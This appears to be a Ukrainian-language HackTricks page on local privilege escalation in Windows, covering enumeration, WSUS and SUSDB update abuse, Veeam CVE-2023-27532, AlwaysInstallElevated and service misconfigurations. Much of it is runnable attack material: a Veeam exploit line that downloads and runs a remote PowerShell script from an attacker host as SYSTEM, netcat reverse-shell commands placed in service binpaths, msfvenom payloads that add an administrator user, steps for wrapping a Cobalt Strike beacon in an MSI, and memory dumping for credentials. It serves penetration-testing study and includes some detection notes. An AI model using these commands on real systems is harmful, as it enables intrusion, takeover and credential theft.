# Локальне підвищення привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ця сторінка об'єднує загальну методологію підвищення привілеїв у Windows із кількох базових посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Її практичний процес enumeration також спирається на community workshops і checklists.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичні матеріали про атаки містять презентацію DerbyCon щодо підвищення привілеїв у Windows.<sup>[[5]](#references)</sup>

## Початкова теорія Windows

### Access Tokens

**Якщо ви не знаєте, що таке access tokens у Windows, прочитайте наведену нижче сторінку, перш ніж продовжити:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Перегляньте наведену нижче сторінку, щоб дізнатися більше про ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, прочитайте наведену нижче сторінку, перш ніж продовжити:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби контролю безпеки Windows

У Windows є різні механізми, які можуть **перешкодити вам виконувати enumeration системи**, запускати виконувані файли або навіть **виявити вашу активність**. Перед початком enumeration для підвищення привілеїв слід **прочитати** наведену нижче **сторінку** та **перерахувати** всі ці **захисні** **механізми**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також може перетворити редагування офлайн UEFI NVRAM на DMA до завантаження системи та ланцюжок модифікації пам'яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Захист адміністратора / тихе підвищення через UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів, якщо перевірки безпечного шляху AppInfo обійдено. Ознайомтеся зі спеціальним процесом обходу UIAccess/Admin Protection тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів accessibility у реєстрі Secure Desktop можна використати для довільного запису до реєстру SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з'явився шлях LPE через **SMB arbitrary-port**, за якого привілейована локальна NTLM-аутентифікація відбивається через повторно використане TCP-з'єднання SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

### Enumeration інформації про версію

Перевірте, чи має версія Windows відомі вразливості (також перевірте встановлені patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Експлойти версій

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку детальної інформації про вразливості безпеки Microsoft. Ця база даних містить понад 4 700 вразливостей безпеки, демонструючи **масштабну поверхню атаки**, яку являє собою середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas має вбудований watson)_

**Локально, використовуючи інформацію про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-репозиторії експлойтів:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережено якісь облікові дані або Juicy info у змінних середовища?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Історія PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Файли транскриптів PowerShell

Дізнатися, як увімкнути цю функцію, можна за посиланням [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Деталі виконання конвеєра PowerShell записуються, включно з виконаними командами, викликами команд і частинами скриптів. Однак повні відомості про виконання та результати виводу можуть не записуватися.

Щоб увімкнути цю функцію, дотримуйтеся інструкцій у розділі документації "Transcript files", вибравши **"Module Logging"** замість **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Щоб переглянути останні 15 подій із журналів PowersShell, можна виконати:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Журналювання блоків скриптів**

Фіксується повний запис активності та всього вмісту під час виконання скрипту, що забезпечує документування кожного блоку коду в процесі його виконання. Це створює комплексний audit trail кожної дії, цінний для forensic-аналізу та дослідження malicious behavior. Документування всієї активності під час виконання забезпечує детальне розуміння процесу.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Події журналювання для Script Block можна знайти в Windows Event Viewer за шляхом: **Журнали застосунків і служб > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна використати:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Налаштування Інтернету
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Накопичувачі
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Ви можете скомпрометувати систему, якщо оновлення запитуються не через http**S**, а через http.

Спочатку перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd наступну команду:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Або наведене нижче в PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Якщо ви отримуєте відповідь на кшталт однієї з наведених нижче:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Тоді **це можна експлуатувати.** Якщо останній registry дорівнює `0`, запис WSUS буде проігноровано.

Щоб експлуатувати ці вразливості, можна використовувати такі tools: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це weaponized MiTM exploit-скрипти для ін’єкції «фальшивих» оновлень у нешифрований SSL-трафік WSUS.

Ознайомтеся з дослідженням тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Читайте повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
По суті, саме цю ваду експлуатує цей bug:

> Якщо ми маємо можливість змінювати proxy локального користувача, а Windows Updates використовує proxy, налаштований у параметрах Internet Explorer, ми отримуємо можливість локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), щоб перехопити власний трафік і виконати код від імені користувача з підвищеними привілеями на нашому asset.
>
> Крім того, оскільки сервіс WSUS використовує налаштування поточного користувача, він також використовуватиме його certificate store. Якщо ми згенеруємо self-signed certificate для hostname WSUS і додамо цей certificate до certificate store поточного користувача, то зможемо перехоплювати як HTTP-, так і HTTPS-трафік WSUS. WSUS не використовує механізми на кшталт HSTS для реалізації перевірки типу trust-on-first-use для certificate. Якщо certificate, який надається, є trusted користувачем і має правильний hostname, сервіс його прийме.

Ви можете експлуатувати цю вразливість за допомогою tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (щойно його буде liberated).

### Зловживання SUSDB custom-update: unsigned payloads через `.txt`/`.esd`

Це інший випадок порушення trust boundary, відмінний від перехоплення HTTP-з’єднання WSUS: необхідною умовою є достатній доступ до **stored procedures бази даних WSUS (`SUSDB`)** для публікації та схвалення custom update. Один із практичних шляхів входу — relaying computer account upstream WSUS на окремий MSSQL server, що містить `SUSDB`; точна необхідна умова залежить від deployment, тому спочатку перелічіть дозволи `EXECUTE`, а не припускайте наявність прав SQL administrator.<sup>[[38]](#references)[[39]](#references)</sup>

Щодо окремого attack path, який relays автентифікацію WSUS client від HTTP/8530 до LDAP, SMB або AD CS, див. [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Створення, вибір цілі та схвалення update

Workflow custom update використовує легітимні процедури WSUS як restricted publishing API. Важливими переходами стану є:<sup>[[38]](#references)</sup>

| Етап | Відповідні stored procedures |
| --- | --- |
| Імпорт metadata update | `spImportUpdate` |
| Збереження prerequisite, localized та extended XML fragments | `spSaveXMLFragment` |
| Пов’язування content digest з URL під контролем attacker | `spSetBatchURL` |
| Перелік/створення computer group і додавання client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Схвалення installation для цієї group | `spDeployUpdate` з `@actionID = 0` і `@isAssigned = 1` |

Ім’я файлу, digests, розмір і handler `CommandLineInstallation` мають збігатися в imported metadata/fragments. Після призначення content URL і target group фінальне схвалення матиме такий вигляд; використовуйте нові update, group і deployment identifiers, а не відтворюйте наведені приклади GUID.<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
@updateID = '<update-guid>', @revisionNumber = 1,
@actionID = 0, @targetGroupID = '<group-guid>',
@isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
@adminName = 'Administrator';
```
#### Обхід підпису через розширення

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката у значення false, якщо надане ім'я файлу закінчується на `.txt` або `.esd`; після цього `CheckCertificateSignature` пропускається без попереднього підтвердження, що байти є текстом або справжнім образом ESD. Тому незмінений PE, названий, наприклад, `payload.exe.txt`, може пройти перевірку вмісту, а згодом бути запущений обробником інсталяції оновлення з командним рядком. Це помилка політики/плутанини типів, а не підробка підпису.<sup>[[39]](#references)</sup>
```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
checkSignature = false;
if (checkSignature)
CheckCertificateSignature(/* downloaded file */);
```
#### BITS-сумісне розміщення та автоматизація

Виклик `spDeployUpdate` змушує WSUS отримати зареєстрований вміст. Джерело має відповідати вимогам BITS до HTTP: одного доступного URL недостатньо, оскільки передавання використовує початкову послідовність `HEAD`/`GET` і запити діапазонів байтів. Сервер без підтримки Range спричиняє подію синхронізації WSUS `EventId=364` із повідомленням, що BITS потребує заголовок протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, необхідний для ланцюжка import/fragment/URL/group/deployment, містить модифікований клієнт MSSQL для його виконання та постачається з `BitsWebServer.py` для розміщення вмісту. Мінімальний виклик у дозволеній лабораторії:<sup>[[40]](#references)</sup>
```bash
python3 NotWSUSpicious.py \
--wsusHostname wsus.lab.local \
--updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
--updateName SecurityUpdate \
--updateFilePath /payloads/payload.exe.txt \
--updateArguments '' \
--computerGroup TestGroup \
--targetComputer workstation.lab.local
python3 BitsWebServer.py
```
#### Автоматичне виконання та persistence повторних спроб

Взаємодія на стороні клієнта залежить від політики. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, параметр `4 - Auto download and schedule install`, змушує схвалене оновлення завантажуватися та встановлюватися за налаштованим розкладом без ручного вибору користувачем. Під час тестування payload, для якого оновлення залишалося невдалим/незавершеним, одразу пропонувався повторно після завершення callback-процесу, тому поведінка повторних спроб може перетворитися на recurring execution persistence; це помітно, оскільки клієнт відображає стан помилки оновлення.<sup>[[39]](#references)</sup>

#### Повороти для виявлення та hardening

Корисні server- і client-side повороти в цьому ланцюжку:<sup>[[39]](#references)</sup>

- Аудитувати виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate` у `SUSDB`; розслідувати нові targeting groups, зовнішні джерела контенту, payload оновлень `.txt`/`.esd` і deployments, виконані неочікуваними principals (особливо некомп'ютерними обліковими записами).
- Перевіряти `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляти verification із розширенням payload і content magic, а не покладатися на suffix.
- Шукати випадки, коли інсталяція Windows Update неодноразово завершується помилкою/повторюється, а також PE execution або неочікувану child/network activity від content із назвами `.txt` чи `.esd`.
- Вимагати Extended Protection for Authentication для database service, де це підтримується, і обмежити network access до database лише WSUS server та авторизованих administrative systems. Мінімізувати й аудіювати права `EXECUTE` на custom-update procedures.

## Сторонні Auto-Updaters і Agent IPC (local privesc)

Багато enterprise agents відкривають localhost IPC surface і privileged update channel. Якщо enrollment можна примусово спрямувати на attacker server, а updater довіряє rogue root CA або використовує слабкі signer checks, локальний користувач може передати malicious MSI, який SYSTEM service встановить. Узагальнену техніку (на основі Netskope stAgentSvc chain – CVE-2025-0309) наведено тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Veeam B&R < `11.0.1.1261` відкриває localhost service на **TCP/9401**, який обробляє повідомлення, контрольовані attacker, що дає змогу виконувати довільні команди від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: підтвердити listener і version, наприклад за допомогою `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: розмістити PoC, наприклад `VeeamHax.exe`, разом із необхідними Veeam DLL у тому самому каталозі, а потім запустити SYSTEM payload через local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Служба виконує команду як SYSTEM.
## KrbRelayUp

У середовищах Windows **домену** за певних умов існує вразливість **локального підвищення привілеїв**. До таких умов належать середовища, де **підписування LDAP не застосовується,** користувачі мають власні права, що дозволяють їм налаштовувати **Resource-Based Constrained Delegation (RBCD),** а також можливість користувачів створювати комп'ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **налаштуваннями за замовчуванням**.

Знайдіть **експлойт у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Докладніше про перебіг атаки див. [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 розділи реєстру **увімкнено** (значення дорівнює **0x1**), користувачі з будь-якими привілеями можуть **встановлювати** (виконувати) файли `*.msi` як NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
Якщо у вас є сесія meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі Windows MSI бінарний файл для підвищення привілеїв. Цей скрипт записує попередньо скомпільований MSI installer, який запитує додавання користувача/групи (тому вам знадобиться доступ GIU):
```
Write-UserAddMSI
```
Просто виконайте створений бінарний файл для підвищення привілеїв.

### MSI Wrapper

Прочитайте цей tutorial, щоб дізнатися, як створити MSI wrapper за допомогою цих tools. Зверніть увагу, що ви можете обгорнути файл "**.bat**", якщо **просто** хочете **виконувати** **командні рядки**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- За допомогою Cobalt Strike або Metasploit **згенеруйте** **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Укажіть назву проєкту, наприклад **AlwaysPrivesc**, використайте **`C:\privesc`** як розташування, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Продовжуйте натискати **Next**, доки не перейдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно згенерований Beacon payload. Потім натисніть **Finish**.
- Виділіть проєкт **AlwaysPrivesc** у **Solution Explorer** і в **Properties** змініть **TargetPlatform** з **x86** на **x64**.
- Ви можете змінити й інші властивості, як-от **Author** і **Manufacturer**, щоб встановлений застосунок виглядав легітимніше.
- Клацніть правою кнопкою миші проєкт і виберіть **View > Custom Actions**.
- Клацніть правою кнопкою миші **Install** і виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить виконання Beacon payload одразу після запуску installer.
- У **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **зіберіть його**.
- Якщо відображається попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили платформу x64.

### Встановлення MSI

Щоб **виконати встановлення** шкідливого файлу `.msi` **у фоновому режимі:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Щоб експлуатувати цю вразливість, можна використати: _exploit/windows/local/always_install_elevated_

## Антивірус і засоби виявлення

### Налаштування аудиту

Ці налаштування визначають, що саме **записується в журнал**, тому слід звернути увагу
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — корисно знати, куди надсилаються логи
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** призначений для **керування паролями локальних адміністраторів**, забезпечуючи, щоб кожен пароль був **унікальним, випадково згенерованим і регулярно оновлювався** на комп’ютерах, приєднаних до домену. Ці паролі безпечно зберігаються в Active Directory, і доступ до них можуть отримати лише користувачі, яким через ACL надано достатні дозволи, що дають змогу переглядати паролі локальних адміністраторів за наявності відповідної авторизації.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо активний, **паролі у відкритому тексті зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**Більше інформації про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам'ять** або впроваджувати код, додатково захищаючи систему.\
[**Більше інформації про LSA Protection тут**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** було представлено у **Windows 10**. Його призначення — захищати облікові дані, збережені на пристрої, від таких загроз, як атаки pass-the-hash. [**Додаткову інформацію про Credential Guard можна знайти тут.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Кешовані облікові дані

**Доменні облікові дані** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, для користувача зазвичай створюються доменні облікові дані.\
[**Додаткова інформація про кешовані облікові дані**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Користувачі та групи

### Перерахування користувачів і груп

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Привілейовані групи

Якщо ви **належите до певної привілейованої групи, ви можете отримати можливість підвищити привілеї**. Дізнайтеся більше про привілейовані групи та способи їх використання для підвищення привілеїв тут:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляція токенами

**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві токени** та способи їх використання:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Користувачі, які увійшли в систему / Сеанси
```bash
qwinsta
klist sessions
```
### Домашні папки
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Політика паролів
```bash
net accounts
```
### Отримання вмісту буфера обміну
```bash
powershell -command "Get-Clipboard"
```
## Запущені процеси

### Дозволи на файли та папки

Перш за все, під час переліку процесів **перевірте наявність паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений бінарний файл** або чи маєте дозволи на запис до папки бінарного файлу, щоб використати можливі [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Завжди перевіряйте, чи не запущені [**electron/cef/chromium debuggers** — ви можете використати їх для підвищення привілеїв](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Перевірка дозволів бінарних файлів процесів**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Перевірка дозволів папок бінарних файлів процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Видобування паролів із пам’яті

Ви можете створити дамп пам’яті запущеного процесу за допомогою **procdump** із sysinternals. Сервіси на кшталт FTP зберігають **облікові дані у відкритому вигляді в пам’яті** — спробуйте створити дамп пам’яті та прочитати облікові дані.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Небезпечні GUI-програми

**Застосунки, що працюють від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: "Windows Help and Support" (Windows + F1), виконайте пошук за запитом "command prompt", натисніть "Click to open Command Prompt"

## Служби

Service Triggers дозволяють Windows запускати службу, коли виникають певні умови (активність іменованого каналу/RPC endpoint, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START ви часто можете запускати привілейовані служби, активуючи їхні тригери. Дивіться методи enumeration та activation тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

Отримати список служб:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Дозволи

Ви можете використовувати **sc**, щоб отримати інформацію про службу
```bash
sc qc <service_name>
```
Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Рекомендується перевірити, чи можуть "Authenticated Users" змінювати будь-яку службу:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Ви можете завантажити accesschk.exe для XP тут](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо у вас виникає така помилка (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Службу не можна запустити, оскільки її вимкнено або з нею не пов'язано жодного увімкненого пристрою._

Ви можете увімкнути її за допомогою
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Врахуйте, що для роботи служба upnphost залежить від SSDPSRV (для XP SP1)**

**Інший спосіб обійти** цю проблему — виконати:
```
sc.exe config usosvc start= auto
```
### **Зміна шляху до бінарного файлу служби**

У сценарії, коли група "Authenticated users" має **SERVICE_ALL_ACCESS** для служби, можна змінити виконуваний бінарний файл служби. Щоб змінити та виконати **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Перезапуск служби
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Привілеї можна підвищити за допомогою різних дозволів:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштовувати бінарний файл служби.
- **WRITE_DAC**: Уможливлює переналаштування дозволів, що дає змогу змінювати конфігурації служб.
- **WRITE_OWNER**: Дозволяє отримати права власника та переналаштувати дозволи.
- **GENERIC_WRITE**: Успадковує можливість змінювати конфігурації служб.
- **GENERIC_ALL**: Також успадковує можливість змінювати конфігурації служб.

Для виявлення та exploitation цієї вразливості можна використовувати _exploit/windows/local/service_permissions_.

